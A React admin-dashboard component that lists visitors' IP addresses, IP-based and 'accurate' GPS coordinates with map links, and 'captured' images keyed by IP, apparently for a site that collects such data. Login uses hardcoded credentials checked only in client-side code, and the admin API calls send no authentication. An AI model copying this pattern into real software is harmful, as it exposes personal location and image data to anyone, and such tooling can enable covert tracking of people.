import React, { useState } from 'react';
import axios from 'axios';
import { API_BASE_URL } from '../App';
import './AdminDashboard.css';

interface UserData {
  _id: string;
  accurateLocation?: {
    lat: number;
    lng: number;
    accurateLocation: string;
  };
  ipLocation: {
    ip: string;
    city: string;
    lat: number;
    lng: number;
    location: string;
  };
  createdAt: string;
  updatedAt: string;
}

interface ImageData {
  id: string;
  ip: string;
  imageData: string;
  capturedAt: string;
}

const AdminDashboard: React.FC = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loginError, setLoginError] = useState('');
  const [activeTab, setActiveTab] = useState<'users' | 'images'>('users');
  const [users, setUsers] = useState<UserData[]>([]);
  const [images, setImages] = useState<ImageData[]>([]);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('');

  const ADMIN_USERNAME = 'monir';
  const ADMIN_PASSWORD = 'monir';

  // Retry function with exponential backoff
  const fetchWithRetry = async (url: string, retries = 3, delay = 2000): Promise<any> => {
    for (let i = 0; i < retries; i++) {
      try {
        const response = await axios.get(url);
        return response;
      } catch (err) {
        if (i === retries - 1) throw err;
        console.log(`Retry ${i + 1}/${retries} after ${delay}ms...`);
        await new Promise(resolve => setTimeout(resolve, delay));
        delay *= 1.5; // Exponential backoff
      }
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      setIsLoggedIn(true);
      setLoginError('');
      setLoadingMessage('⏳ Waking up backend... (first load may take 30-45 seconds)');
      fetchAllData();
    } else {
      setLoginError('Invalid username or password');
    }
  };

  const fetchAllData = async () => {
    setLoading(true);
    try {
      setLoadingMessage('⏳ Fetching users...');
      const usersRes = await fetchWithRetry(`${API_BASE_URL}/api/admin/users`);
      setUsers(usersRes.data.users);
      
      setLoadingMessage('⏳ Fetching images...');
      const imagesRes = await fetchWithRetry(`${API_BASE_URL}/api/admin/images`);
      setImages(imagesRes.data.images);
      
      setLoadingMessage('');
    } catch (err: any) {
      console.error('Error fetching data:', err);
      setLoginError(`Failed to fetch data: ${err.message || 'Backend not responding. Try again in 30 seconds.'}`);
      setIsLoggedIn(false);
    } finally {
      setLoading(false);
    }
  };

  const handleLogout = () => {
    setIsLoggedIn(false);
    setUsername('');
    setPassword('');
    setUsers([]);
    setImages([]);
  };

  if (!isLoggedIn) {
    return (
      <div className="admin-login-container">
        <div className="login-box">
          <h1>Admin Dashboard</h1>
          <form onSubmit={handleLogin}>
            <div className="form-group">
              <label>Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Enter username"
              />
            </div>
            <div className="form-group">
              <label>Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter password"
              />
            </div>
            {loginError && <p className="error-message">{loginError}</p>}
            <button type="submit" className="login-btn">
              Login
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="admin-dashboard">
      <header className="admin-header">
        <h1>Admin Dashboard</h1>
        <button onClick={handleLogout} className="logout-btn">
          Logout
        </button>
      </header>

      <div className="tabs">
        <button
          className={`tab-btn ${activeTab === 'users' ? 'active' : ''}`}
          onClick={() => setActiveTab('users')}
        >
          Users ({users.length})
        </button>
        <button
          className={`tab-btn ${activeTab === 'images' ? 'active' : ''}`}
          onClick={() => setActiveTab('images')}
        >
          Images ({images.length})
        </button>
      </div>

      <div className="tab-content">
        {loading ? (
          <div className="loading">
            <p>{loadingMessage || 'Loading data...'}</p>
            <p style={{ fontSize: '12px', color: '#999', marginTop: '10px' }}>
              ⚠️ Render free tier may take 30-45 seconds on first load
            </p>
          </div>
        ) : activeTab === 'users' ? (
          <div className="users-grid">
            {users.length > 0 ? (
              users.map((user) => (
                <div key={user._id} className="user-card">
                  <h3>IP: {user.ipLocation.ip}</h3>
                  <div className="user-info">
                    <p>
                      <strong>City:</strong> {user.ipLocation.city}
                    </p>
                    <p>
                      <strong>IP Latitude:</strong> {user.ipLocation.lat.toFixed(4)}
                    </p>
                    <p>
                      <strong>IP Longitude:</strong> {user.ipLocation.lng.toFixed(4)}
                    </p>
                    {user.accurateLocation && (
                      <>
                        <p>
                          <strong>Accurate Latitude:</strong> {user.accurateLocation.lat.toFixed(4)}
                        </p>
                        <p>
                          <strong>Accurate Longitude:</strong> {user.accurateLocation.lng.toFixed(4)}
                        </p>
                        <p>
                          <a href={user.accurateLocation.accurateLocation} target="_blank" rel="noopener noreferrer" className="map-link">
                            View Accurate Location
                          </a>
                        </p>
                      </>
                    )}
                    <p>
                      <a href={user.ipLocation.location} target="_blank" rel="noopener noreferrer" className="map-link">
                        View IP Location
                      </a>
                    </p>
                    <p className="timestamp">
                      <strong>Created:</strong> {new Date(user.createdAt).toLocaleString()}
                    </p>
                    <p className="timestamp">
                      <strong>Updated:</strong> {new Date(user.updatedAt).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))
            ) : (
              <div className="no-data">No users found</div>
            )}
          </div>
        ) : (
          <div className="images-grid">
            {images.length > 0 ? (
              images.map((image) => (
                <div key={image.id} className="image-card">
                  <img src={image.imageData} alt="Captured" className="thumbnail" />
                  <div className="image-info">
                    <p>
                      <strong>IP:</strong> {image.ip}
                    </p>
                    <p className="timestamp">
                      {new Date(image.capturedAt).toLocaleString()}
                    </p>
                  </div>
                </div>
              ))
            ) : (
              <div className="no-data">No images found</div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;
